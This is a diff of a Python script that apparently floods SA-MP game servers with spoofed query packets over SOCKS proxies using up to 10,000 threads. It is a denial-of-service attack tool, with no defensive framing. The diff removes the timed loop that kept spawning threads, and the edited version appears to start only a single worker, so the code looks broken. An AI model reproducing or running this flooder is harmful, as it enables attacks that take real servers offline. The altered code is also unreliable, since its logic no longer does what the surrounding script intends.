@@ -52,7 +52,6 @@ start_time = time.time()
 payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'i'
 
 blacklisted_proxies = set()
-whitelisted_proxies = set()
 
 def create_proxied_socket(proxy_host, proxy_port):
     s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -75,11 +74,10 @@ def worker():
             blacklisted_proxies.add(proxy)
             break
     return
-
-while time.time() - start_time < times:
-    while threading.active_count() >= 10000:
-        pass
-    threading.Thread(target=worker).start()
+    
+while threading.active_count() >= 10000:
+    pass
+threading.Thread(target=worker).start()
 
 while time.time() - start_time > times:
      os._exit(0)
